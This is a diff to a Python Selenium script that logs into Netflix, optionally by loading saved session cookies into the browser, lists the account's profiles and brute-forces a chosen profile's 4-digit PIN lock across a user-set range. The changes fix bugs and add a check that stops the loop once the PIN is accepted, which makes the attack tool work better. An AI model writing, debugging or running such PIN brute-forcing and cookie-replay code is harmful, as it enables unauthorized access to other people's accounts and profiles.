@@ -2,21 +2,25 @@ import pickle
 import requests
 import json
 from selenium import webdriver
-with open('cookie.json',"r") as f:
-    data = json.load(f)
-json_string = json.dumps(data)
+try:
+    with open('cookie.json',"r") as f:
+        data = json.load(f)
+    json_string = json.dumps(data)
+    pickle.dump( data , open("cookies.pkl","wb"))
+except:
+    print("cookie.json not found, only use this when you are using cookies")
 
 
 # print(json_string)
-pickle.dump( data , open("cookies.pkl","wb"))
+
 browser = webdriver.Chrome('chromedriver.exe')
 
 browser.get('https://www.netflix.com/login')
 # print(browser.get_cookies())
 
 print("login or use cookies")
-cookie_use=input("press y to use cookies")
-if(cookie_use==y):
+cookie_use=input("press y to use cookies: ")
+if(cookie_use=='y'):
     browser.delete_all_cookies()
     cookies = pickle.load(open("cookies.pkl", "rb"))
     for cookie in cookies:
@@ -35,11 +39,11 @@ i=0
 print("*"*10)
 
 for profile in profile_names:
-    print(i,ends=" ")
+    print(i,end=" ")
     print(profile)
     i+=1
 
-profile_input=int(input("Select profile number to brute force"))
+profile_input=int(input("Select profile number to brute force: \n"))
 
 
 # print(profile_names)
@@ -47,8 +51,8 @@ isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) 
 print(isPresent)
 profiles[profile_input].click()
 inputs=browser.find_elements_by_class_name('pin-number-input')
-testuserst=int(input("Select start number 0 to 9998"))
-testusered=int(input("Select end number 1 to 9999"))
+testuserst=int(input("Select start number 0 to 9998: "))
+testusered=int(input("Select end number 1 to 9999: "))
 
 brutetest=testuserst
 
@@ -66,6 +70,12 @@ while(not isPresent):
     print(z[1],end="")
     print(z[2],end="")
     print(z[3])
+    isPresent2 = len(browser.find_elements_by_class_name('pin-number-input')) > 0
+    if(not isPresent2):
+        brutetest-=1
+        break
+
+
     if(brutetest>testusered):
         break
     # print(z)
